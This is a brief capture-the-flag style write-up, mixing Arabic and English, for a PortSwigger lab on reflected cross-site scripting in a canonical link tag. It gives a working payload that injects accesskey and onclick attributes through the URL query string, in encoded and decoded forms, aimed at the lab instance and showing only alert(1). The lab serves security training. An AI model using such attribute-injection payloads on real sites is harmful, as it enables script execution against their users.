# Lab: Reflected XSS in canonical link tag

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

- الفكره من الlab ده انك تجرب ثغرف مش شغاله غير علي متصفح chrome وبتضغط علي زرار معين لكل نطام تشغيل وهي من نوع reflected يعني ممكن تتكتب في link or any input show in your page not save in database

```bash
1. in usrl ==> https://0a9900cb04b2480780871c02007900d3.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)

2. ?%27accesskey=%27x%27onclick=%27alert(1) 

3. ?'accesskey='x'onclick='alert(1)
```
